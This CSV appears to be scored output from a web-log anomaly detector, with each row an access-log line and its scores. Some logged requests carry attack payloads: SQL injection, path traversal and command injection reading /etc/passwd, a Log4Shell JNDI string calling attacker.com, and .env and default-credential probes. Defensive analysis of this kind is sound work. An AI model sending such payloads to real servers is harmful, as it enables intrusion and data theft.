score_content,score_session,score_fused,score_fused_norm,line
0.24169397354125977,,0.24169397354125977,0.24169397354125977,105.31.138.92 - - [10/Jan/2025:12:09:36 +0000] "GET /assets/app.js HTTP/1.1" 200 10390 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0240871906280518,,2.0240871906280518,2.0240871906280518,212.181.179.155 - - [10/Jan/2025:12:09:38 +0000] "GET /contact HTTP/1.1" 200 10068 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11053.5732421875,,11053.5732421875,11053.5732421875,132.13.174.77 - - [10/Jan/2025:12:09:40 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 500 811 "https://www.google.com/" "python-requests/2.31.0"
24.3719539642334,,24.3719539642334,24.3719539642334,64.25.119.27 - - [10/Jan/2025:12:09:40 +0000] "GET /search?q=camera HTTP/1.1" 200 18126 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.229595184326172,,24.229595184326172,24.229595184326172,96.176.162.241 - - [10/Jan/2025:12:09:40 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 13226 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0765461921691895,,2.0765461921691895,2.0765461921691895,51.232.166.114 - - [10/Jan/2025:12:09:44 +0000] "GET /about HTTP/1.1" 200 2212 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.1970854252576828,,0.1970854252576828,0.1970854252576828,111.211.186.102 - - [10/Jan/2025:12:09:46 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 18905 "-" "nikto/2.5.0"
0.2280540019273758,,0.2280540019273758,0.2280540019273758,71.72.115.227 - - [10/Jan/2025:12:09:49 +0000] "GET /assets/app.js HTTP/1.1" 200 6232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.411468505859375,,24.411468505859375,24.411468505859375,106.226.141.123 - - [10/Jan/2025:12:09:53 +0000] "GET /api/product?id=123 HTTP/1.1" 204 16447 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.39269256591797,,24.39269256591797,24.39269256591797,64.162.206.140 - - [10/Jan/2025:12:09:55 +0000] "GET /search?q=phone HTTP/1.1" 200 17329 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.298992156982422,,24.298992156982422,24.298992156982422,129.83.100.70 - - [10/Jan/2025:12:10:00 +0000] "GET /search?q=headphones HTTP/1.1" 200 18635 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30141.923828125,,30141.923828125,30141.923828125,15.208.254.121 - - [10/Jan/2025:12:10:02 +0000] "GET / HTTP/1.1" 403 575 "https://example.com/" "python-requests/2.31.0"
0.23396743834018707,,0.23396743834018707,0.23396743834018707,69.137.209.203 - - [10/Jan/2025:12:10:06 +0000] "GET /assets/app.js HTTP/1.1" 200 8002 "-" "sqlmap/1.5.10#stable"
24.335111618041992,,24.335111618041992,24.335111618041992,46.61.152.82 - - [10/Jan/2025:12:10:07 +0000] "GET /search?q=laptop HTTP/1.1" 200 5792 "https://example.com/" "sqlmap/1.5.10#stable"
30165.068359375,,30165.068359375,30165.068359375,37.145.243.49 - - [10/Jan/2025:12:10:11 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 429 1154 "https://twitter.com/" "nikto/2.5.0"
0.3164707124233246,,0.3164707124233246,0.3164707124233246,155.57.6.135 - - [10/Jan/2025:12:10:13 +0000] "GET /index.html HTTP/1.1" 200 7722 "-" "Wget/1.20.3 (linux-gnu)"
4.896236419677734,,4.896236419677734,4.896236419677734,184.46.236.206 - - [10/Jan/2025:12:10:15 +0000] "GET /api/products HTTP/1.1" 304 11265 "-" "curl/7.68.0"
3.108551263809204,,3.108551263809204,3.108551263809204,221.94.246.19 - - [10/Jan/2025:12:10:15 +0000] "GET /../../etc/passwd HTTP/1.1" 304 17345 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.38410758972168,,24.38410758972168,24.38410758972168,188.243.112.203 - - [10/Jan/2025:12:10:19 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 5261 "https://example.com/" "nikto/2.5.0"
2.04999041557312,,2.04999041557312,2.04999041557312,209.45.97.79 - - [10/Jan/2025:12:10:20 +0000] "GET /profile HTTP/1.1" 200 19398 "https://example.com/" "sqlmap/1.5.10#stable"
30143.056640625,,30143.056640625,30143.056640625,101.218.198.248 - - [10/Jan/2025:12:10:21 +0000] "GET / HTTP/1.1" 429 1173 "-" "python-requests/2.31.0"
24.377159118652344,,24.377159118652344,24.377159118652344,240.128.37.85 - - [10/Jan/2025:12:10:22 +0000] "GET /api/product?id=123 HTTP/1.1" 201 3511 "-" "sqlmap/1.5.10#stable"
1.9351001977920532,,1.9351001977920532,1.9351001977920532,211.182.172.164 - - [10/Jan/2025:12:10:23 +0000] "GET /dashboard HTTP/1.1" 200 3007 "https://example.com/" "sqlmap/1.5.10#stable"
24.185462951660156,,24.185462951660156,24.185462951660156,90.66.202.28 - - [10/Jan/2025:12:10:26 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11053.73046875,,11053.73046875,11053.73046875,127.226.97.90 - - [10/Jan/2025:12:10:29 +0000] "GET /search?q=phone HTTP/1.1" 500 847 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.378013610839844,,24.378013610839844,24.378013610839844,205.217.9.76 - - [10/Jan/2025:12:10:29 +0000] "GET /api/product?id=123 HTTP/1.1" 200 2515 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.105374336242676,,2.105374336242676,2.105374336242676,42.188.20.141 - - [10/Jan/2025:12:10:31 +0000] "GET /about HTTP/1.1" 200 12403 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.16283416748047,,27.16283416748047,27.16283416748047,242.168.43.156 - - [10/Jan/2025:12:10:35 +0000] "GET /search?q=headphones HTTP/1.1" 302 14233 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
11053.556640625,,11053.556640625,11053.556640625,179.142.185.237 - - [10/Jan/2025:12:10:35 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 500 838 "https://example.com/" "python-requests/2.31.0"
0.34683677554130554,,0.34683677554130554,0.34683677554130554,216.126.40.14 - - [10/Jan/2025:12:10:37 +0000] "GET /index.html HTTP/1.1" 200 18111 "-" "curl/7.68.0"
24.565906524658203,,24.565906524658203,24.565906524658203,53.44.164.75 - - [10/Jan/2025:12:10:40 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 943 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.345054626464844,,24.345054626464844,24.345054626464844,24.165.140.100 - - [10/Jan/2025:12:10:40 +0000] "GET /search?q=laptop HTTP/1.1" 200 8783 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.362394332885742,,24.362394332885742,24.362394332885742,120.68.58.215 - - [10/Jan/2025:12:10:43 +0000] "GET /search?q=camera HTTP/1.1" 200 14509 "https://twitter.com/" "curl/7.68.0"
2.0281217098236084,,2.0281217098236084,2.0281217098236084,207.139.106.249 - - [10/Jan/2025:12:10:43 +0000] "GET /contact HTTP/1.1" 200 11365 "https://www.google.com/" "python-requests/2.31.0"
30140.0234375,,30140.0234375,30140.0234375,248.138.176.222 - - [10/Jan/2025:12:10:47 +0000] "GET /.env HTTP/1.1" 400 857 "https://twitter.com/" "nikto/2.5.0"
2.0823681354522705,,2.0823681354522705,2.0823681354522705,129.147.231.133 - - [10/Jan/2025:12:10:48 +0000] "GET /about HTTP/1.1" 200 1237 "https://twitter.com/" "python-requests/2.31.0"
0.1576012820005417,,0.1576012820005417,0.1576012820005417,249.55.207.50 - - [10/Jan/2025:12:10:49 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 5577 "-" "curl/7.68.0"
1.8252708911895752,,1.8252708911895752,1.8252708911895752,214.153.67.82 - - [10/Jan/2025:12:10:52 +0000] "GET /server-status HTTP/1.1" 200 4945 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30141.470703125,,30141.470703125,30141.470703125,118.235.224.4 - - [10/Jan/2025:12:10:55 +0000] "GET /dashboard HTTP/1.1" 401 1064 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.35533332824707,,24.35533332824707,24.35533332824707,38.146.151.150 - - [10/Jan/2025:12:10:59 +0000] "GET /search?q=phone HTTP/1.1" 200 5003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30141.66796875,,30141.66796875,30141.66796875,225.106.68.99 - - [10/Jan/2025:12:11:03 +0000] "GET /logout HTTP/1.1" 403 704 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.33390143513679504,,0.33390143513679504,0.33390143513679504,37.159.156.175 - - [10/Jan/2025:12:11:07 +0000] "GET /index.html HTTP/1.1" 200 13304 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.792391300201416,,4.792391300201416,4.792391300201416,191.122.236.69 - - [10/Jan/2025:12:11:07 +0000] "GET /dashboard HTTP/1.1" 301 1715 "-" "curl/7.68.0"
2.078127861022949,,2.078127861022949,2.078127861022949,220.179.176.26 - - [10/Jan/2025:12:11:09 +0000] "GET /logout HTTP/1.1" 200 16209 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.266294479370117,,27.266294479370117,27.266294479370117,69.187.107.155 - - [10/Jan/2025:12:11:11 +0000] "GET /search?q=camera HTTP/1.1" 304 10614 "-" "sqlmap/1.5.10#stable"
27.26734733581543,,27.26734733581543,27.26734733581543,223.96.211.15 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=phone HTTP/1.1" 302 17024 "https://www.google.com/" "python-requests/2.31.0"
24.369800567626953,,24.369800567626953,24.369800567626953,226.146.8.45 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=laptop HTTP/1.1" 200 17279 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.354869842529297,,24.354869842529297,24.354869842529297,181.51.71.95 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=camera HTTP/1.1" 200 11908 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
4.873250961303711,,4.873250961303711,4.873250961303711,96.126.153.115 - - [10/Jan/2025:12:11:15 +0000] "GET /contact HTTP/1.1" 301 8027 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.019268035888672,,2.019268035888672,2.019268035888672,192.213.177.24 - - [10/Jan/2025:12:11:19 +0000] "GET /profile HTTP/1.1" 200 8575 "-" "curl/7.68.0"
30163.720703125,,30163.720703125,30163.720703125,58.174.53.69 - - [10/Jan/2025:12:11:22 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 401 1325 "https://twitter.com/" "dirb/2.22"
2.2946507930755615,,2.2946507930755615,2.2946507930755615,166.45.154.206 - - [10/Jan/2025:12:11:22 +0000] "GET / HTTP/1.1" 200 4435 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.932723045349121,,4.932723045349121,4.932723045349121,109.230.97.219 - - [10/Jan/2025:12:11:24 +0000] "GET /logout HTTP/1.1" 302 9123 "https://news.ycombinator.com/" "curl/7.68.0"
4.925339698791504,,4.925339698791504,4.925339698791504,150.27.2.131 - - [10/Jan/2025:12:11:26 +0000] "GET /logout HTTP/1.1" 301 13113 "https://example.com/" "sqlmap/1.5.10#stable"
2.0398874282836914,,2.0398874282836914,2.0398874282836914,124.17.87.254 - - [10/Jan/2025:12:11:30 +0000] "GET /logout HTTP/1.1" 200 3642 "https://example.com/" "curl/7.68.0"
2.0803298950195312,,2.0803298950195312,2.0803298950195312,196.62.231.15 - - [10/Jan/2025:12:11:32 +0000] "GET /logout HTTP/1.1" 200 17050 "https://news.ycombinator.com/" "python-requests/2.31.0"
3.1099870204925537,,3.1099870204925537,3.1099870204925537,76.67.233.108 - - [10/Jan/2025:12:11:37 +0000] "GET /assets/app.css HTTP/1.1" 302 16397 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.198503494262695,,24.198503494262695,24.198503494262695,176.137.164.201 - - [10/Jan/2025:12:11:42 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 7386 "https://example.com/" "nikto/2.5.0"
30139.720703125,,30139.720703125,30139.720703125,47.76.25.121 - - [10/Jan/2025:12:11:46 +0000] "GET /assets/app.js HTTP/1.1" 400 1143 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30141.005859375,,30141.005859375,30141.005859375,168.23.57.91 - - [10/Jan/2025:12:11:51 +0000] "GET /assets/app.js HTTP/1.1" 429 687 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9823195934295654,,1.9823195934295654,1.9823195934295654,76.119.218.31 - - [10/Jan/2025:12:11:54 +0000] "GET /dashboard HTTP/1.1" 200 19287 "-" "Wget/1.20.3 (linux-gnu)"
2.0864012241363525,,2.0864012241363525,2.0864012241363525,129.31.223.175 - - [10/Jan/2025:12:11:59 +0000] "GET /about HTTP/1.1" 200 6474 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.2050473541021347,,0.2050473541021347,0.2050473541021347,88.105.253.146 - - [10/Jan/2025:12:12:01 +0000] "GET /assets/app.css HTTP/1.1" 200 6663 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
3.1735305786132812,,3.1735305786132812,3.1735305786132812,86.162.253.46 - - [10/Jan/2025:12:12:03 +0000] "GET /assets/app.js HTTP/1.1" 304 16077 "-" "curl/7.68.0"
4.837930679321289,,4.837930679321289,4.837930679321289,148.196.41.126 - - [10/Jan/2025:12:12:03 +0000] "GET /api/products HTTP/1.1" 302 5624 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.388526916503906,,24.388526916503906,24.388526916503906,99.2.10.137 - - [10/Jan/2025:12:12:07 +0000] "GET /search?q=phone HTTP/1.1" 200 15743 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0209426879882812,,2.0209426879882812,2.0209426879882812,161.188.64.58 - - [10/Jan/2025:12:12:07 +0000] "GET /api/products HTTP/1.1" 200 235 "https://example.com/" "sqlmap/1.5.10#stable"
0.5366077423095703,,0.5366077423095703,0.5366077423095703,43.17.211.12 - - [10/Jan/2025:12:12:09 +0000] "GET /.env HTTP/1.1" 200 10130 "https://example.com/" "python-requests/2.31.0"
1.9384876489639282,,1.9384876489639282,1.9384876489639282,88.231.126.92 - - [10/Jan/2025:12:12:12 +0000] "GET /dashboard HTTP/1.1" 200 4484 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.077028274536133,,27.077028274536133,27.077028274536133,55.188.6.151 - - [10/Jan/2025:12:12:15 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 4399 "-" "curl/7.68.0"
0.3189849555492401,,0.3189849555492401,0.3189849555492401,198.137.160.13 - - [10/Jan/2025:12:12:17 +0000] "GET /index.html HTTP/1.1" 200 8481 "-" "python-requests/2.31.0"
2.0784006118774414,,2.0784006118774414,2.0784006118774414,107.114.98.32 - - [10/Jan/2025:12:12:22 +0000] "GET /admin HTTP/1.1" 200 3894 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.2920687198638916,,2.2920687198638916,2.2920687198638916,170.134.70.160 - - [10/Jan/2025:12:12:27 +0000] "GET / HTTP/1.1" 200 3408 "https://www.google.com/" "python-requests/2.31.0"
2.0044302940368652,,2.0044302940368652,2.0044302940368652,73.30.201.28 - - [10/Jan/2025:12:12:30 +0000] "GET /contact HTTP/1.1" 200 3957 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30141.599609375,,30141.599609375,30141.599609375,92.181.105.76 - - [10/Jan/2025:12:12:34 +0000] "GET /login HTTP/1.1" 400 413 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.8497748374938965,,4.8497748374938965,4.8497748374938965,85.61.1.4 - - [10/Jan/2025:12:12:38 +0000] "GET /api/products HTTP/1.1" 301 15850 "-" "sqlmap/1.5.10#stable"
24.253435134887695,,24.253435134887695,24.253435134887695,200.131.20.186 - - [10/Jan/2025:12:12:38 +0000] "GET /search?q=headphones HTTP/1.1" 200 3051 "-" "sqlmap/1.5.10#stable"
11053.83984375,,11053.83984375,11053.83984375,68.119.13.26 - - [10/Jan/2025:12:12:40 +0000] "GET /search?q=camera HTTP/1.1" 502 606 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9368761777877808,,1.9368761777877808,1.9368761777877808,25.218.195.228 - - [10/Jan/2025:12:12:42 +0000] "GET /dashboard HTTP/1.1" 200 3897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.253696084022522,,0.253696084022522,0.253696084022522,245.160.69.225 - - [10/Jan/2025:12:12:43 +0000] "GET /assets/app.js HTTP/1.1" 200 14443 "-" "sqlmap/1.5.10#stable"
0.25021007657051086,,0.25021007657051086,0.25021007657051086,247.117.70.214 - - [10/Jan/2025:12:12:45 +0000] "GET /assets/app.js HTTP/1.1" 200 13215 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.21939696371555328,,0.21939696371555328,0.21939696371555328,252.242.217.41 - - [10/Jan/2025:12:12:48 +0000] "GET /assets/app.js HTTP/1.1" 200 2021 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.356761932373047,,24.356761932373047,24.356761932373047,200.92.157.8 - - [10/Jan/2025:12:12:52 +0000] "GET /search?q=camera HTTP/1.1" 200 12543 "https://www.google.com/" "sqlmap/1.5.10#stable"
30141.625,,30141.625,30141.625,12.17.67.168 - - [10/Jan/2025:12:12:55 +0000] "GET /contact HTTP/1.1" 403 902 "-" "curl/7.68.0"
11053.7451171875,,11053.7451171875,11053.7451171875,224.87.133.134 - - [10/Jan/2025:12:13:00 +0000] "GET /api/product?id=123 HTTP/1.1" 500 1371 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.407978057861328,,24.407978057861328,24.407978057861328,39.215.212.143 - - [10/Jan/2025:12:13:00 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12711 "-" "python-requests/2.31.0"
0.25653553009033203,,0.25653553009033203,0.25653553009033203,219.127.223.43 - - [10/Jan/2025:12:13:00 +0000] "GET /assets/app.js HTTP/1.1" 200 15477 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.089491367340088,,2.089491367340088,2.089491367340088,141.165.97.104 - - [10/Jan/2025:12:13:02 +0000] "GET /login HTTP/1.1" 200 7397 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.36760139465332,,24.36760139465332,24.36760139465332,115.81.31.252 - - [10/Jan/2025:12:13:05 +0000] "GET /search?q=camera HTTP/1.1" 200 16433 "-" "Wget/1.20.3 (linux-gnu)"
0.4195822775363922,,0.4195822775363922,0.4195822775363922,212.24.203.155 - - [10/Jan/2025:12:13:05 +0000] "GET /index.html HTTP/1.1" 200 105 "https://example.com/" "python-requests/2.31.0"
30165.107421875,,30165.107421875,30165.107421875,212.14.210.58 - - [10/Jan/2025:12:13:09 +0000] "GET /search?q=camera HTTP/1.1" 429 744 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
27.156370162963867,,27.156370162963867,27.156370162963867,184.116.30.25 - - [10/Jan/2025:12:13:13 +0000] "GET /search?q=headphones HTTP/1.1" 302 12004 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.0673131942749023,,2.0673131942749023,2.0673131942749023,180.28.12.230 - - [10/Jan/2025:12:13:13 +0000] "GET /logout HTTP/1.1" 200 12351 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.360288619995117,,24.360288619995117,24.360288619995117,49.31.239.219 - - [10/Jan/2025:12:13:14 +0000] "GET /search?q=phone HTTP/1.1" 200 6519 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
4.8321146965026855,,4.8321146965026855,4.8321146965026855,194.107.12.238 - - [10/Jan/2025:12:13:17 +0000] "GET /api/products HTTP/1.1" 302 3631 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.375123977661133,,24.375123977661133,24.375123977661133,245.130.35.247 - - [10/Jan/2025:12:13:17 +0000] "GET /search?q=camera HTTP/1.1" 200 19410 "-" "Wget/1.20.3 (linux-gnu)"
30163.849609375,,30163.849609375,30163.849609375,237.131.200.236 - - [10/Jan/2025:12:13:21 +0000] "GET /search?q=phone HTTP/1.1" 400 989 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.24305371940135956,,0.24305371940135956,0.24305371940135956,156.226.83.130 - - [10/Jan/2025:12:13:22 +0000] "GET /assets/app.css HTTP/1.1" 200 19778 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.403852462768555,,24.403852462768555,24.403852462768555,249.76.116.207 - - [10/Jan/2025:12:13:26 +0000] "GET /api/product?id=123 HTTP/1.1" 200 11334 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30141.53125,,30141.53125,30141.53125,221.81.183.189 - - [10/Jan/2025:12:13:29 +0000] "GET /logout HTTP/1.1" 400 1121 "https://www.google.com/" "python-requests/2.31.0"
4.897797107696533,,4.897797107696533,4.897797107696533,252.182.167.250 - - [10/Jan/2025:12:13:30 +0000] "GET /logout HTTP/1.1" 301 4447 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.8370041847229,,4.8370041847229,4.8370041847229,144.123.150.147 - - [10/Jan/2025:12:13:34 +0000] "GET /dashboard HTTP/1.1" 302 11642 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30141.662109375,,30141.662109375,30141.662109375,207.4.134.28 - - [10/Jan/2025:12:13:39 +0000] "GET /logout HTTP/1.1" 403 865 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2513602077960968,,0.2513602077960968,0.2513602077960968,252.74.175.65 - - [10/Jan/2025:12:13:40 +0000] "GET /wp-login.php HTTP/1.1" 200 5373 "-" "curl/7.68.0"
4.837869167327881,,4.837869167327881,4.837869167327881,92.209.116.27 - - [10/Jan/2025:12:13:45 +0000] "GET /api/products HTTP/1.1" 302 1158 "https://twitter.com/" "python-requests/2.31.0"
24.34745979309082,,24.34745979309082,24.34745979309082,178.171.13.238 - - [10/Jan/2025:12:13:46 +0000] "GET /search?q=laptop HTTP/1.1" 200 9525 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
11031.4677734375,,11031.4677734375,11031.4677734375,4.191.65.52 - - [10/Jan/2025:12:13:49 +0000] "GET /dashboard HTTP/1.1" 500 110 "https://news.ycombinator.com/" "python-requests/2.31.0"
4.922000885009766,,4.922000885009766,4.922000885009766,190.155.51.199 - - [10/Jan/2025:12:13:50 +0000] "GET /profile HTTP/1.1" 302 18011 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.0841431617736816,,2.0841431617736816,2.0841431617736816,189.132.31.97 - - [10/Jan/2025:12:13:52 +0000] "GET /about HTTP/1.1" 200 5794 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.21102185547351837,,0.21102185547351837,0.21102185547351837,2.85.120.182 - - [10/Jan/2025:12:13:54 +0000] "GET /assets/app.css HTTP/1.1" 200 8456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.2391815185546875,,3.2391815185546875,3.2391815185546875,126.203.147.141 - - [10/Jan/2025:12:13:55 +0000] "GET /index.html HTTP/1.1" 304 9968 "-" "curl/7.68.0"
30165.1484375,,30165.1484375,30165.1484375,18.202.130.41 - - [10/Jan/2025:12:14:00 +0000] "GET /api/product?id=123 HTTP/1.1" 429 1066 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
2.014335870742798,,2.014335870742798,2.014335870742798,170.85.85.93 - - [10/Jan/2025:12:14:04 +0000] "GET /profile HTTP/1.1" 200 7091 "https://www.google.com/" "curl/7.68.0"
2.3172459602355957,,2.3172459602355957,2.3172459602355957,115.62.232.165 - - [10/Jan/2025:12:14:08 +0000] "GET / HTTP/1.1" 200 11437 "https://twitter.com/" "python-requests/2.31.0"
1.9366717338562012,,1.9366717338562012,1.9366717338562012,99.66.139.186 - - [10/Jan/2025:12:14:09 +0000] "GET /dashboard HTTP/1.1" 200 3815 "-" "curl/7.68.0"
2.0433781147003174,,2.0433781147003174,2.0433781147003174,115.125.12.76 - - [10/Jan/2025:12:14:13 +0000] "GET /profile HTTP/1.1" 200 16770 "https://www.google.com/" "sqlmap/1.5.10#stable"
